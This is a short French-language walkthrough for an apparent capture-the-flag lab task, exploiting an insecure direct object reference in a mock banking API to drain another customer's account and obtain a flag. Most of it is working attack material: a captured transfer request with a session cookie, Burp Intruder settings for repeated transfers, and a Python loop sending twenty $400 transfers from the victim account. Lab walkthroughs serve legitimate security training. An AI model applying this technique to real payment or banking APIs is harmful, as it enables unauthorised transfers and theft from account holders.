# MÉTHODE RAPIDE - Task 2 IDOR

## 🚀 Exploit le MÊME compte plusieurs fois

Tu as déjà les infos de Linda Robinson :
- account_id: `8d06b28a94b2467ebc0018dcfc09b5e9`
- routing: `106190008`
- number: `103811509841`
- Balance: ~$456

## 🎯 Config Burp Intruder

### 1. Capture un transfert dans Proxy
```http
POST /api/accounts/transfer_to/c962c1e9ca0246ca82e945a40f119572 HTTP/1.1
Host: web0x06.hbtn
Content-Type: application/json
Cookie: session=iJ9ikFRzwzc1b9sEakXNSJ13tOr68db3uEF5rlI6Vcw.xxYUvubh_Sq8jDg3P_Yx3P7mNyI

{"amount":500,"raison":"transfert","account_id":"8d06b28a94b2467ebc0018dcfc09b5e9","routing":"106190008","number":"103811509841"}
```

### 2. Send to Intruder (Ctrl+I)

### 3. Onglet Positions
- Attack type: **Sniper**
- Clear all §
- Marque juste le montant :
```json
{"amount":§500§,"raison":"transfert","account_id":"8d06b28a94b2467ebc0018dcfc09b5e9","routing":"106190008","number":"103811509841"}
```

### 4. Onglet Payloads
Type: **Numbers**
- From: 100
- To: 400
- Step: 100

Ou juste une simple liste :
```
100
200
300
400
```

### 5. Start Attack !

Burp fera 4 transferts de $100 à $400 depuis le même compte.

## ✅ Encore plus simple : Script Python

```python
import requests

url = "http://web0x06.hbtn/api/accounts/transfer_to/c962c1e9ca0246ca82e945a40f119572"
session = "iJ9ikFRzwzc1b9sEakXNSJ13tOr68db3uEF5rlI6Vcw.xxYUvubh_Sq8jDg3P_Yx3P7mNyI"

for i in range(20):
    data = {
        "amount": 400,
        "raison": "transfert",
        "account_id": "8d06b28a94b2467ebc0018dcfc09b5e9",
        "routing": "106190008",
        "number": "103811509841"
    }
    
    r = requests.post(url, json=data, headers={"Cookie": f"session={session}"})
    print(f"Transfer {i+1}: {r.json()}")
```

20 × $400 = $8,000 → Devrait suffire !

## 🎉 Récupérer le flag

Une fois que tu as assez d'argent, fais :
```http
GET /api/customer/info/me HTTP/1.1
Cookie: session=...
```

Le **flag_2** devrait être dans la réponse ! 🚀
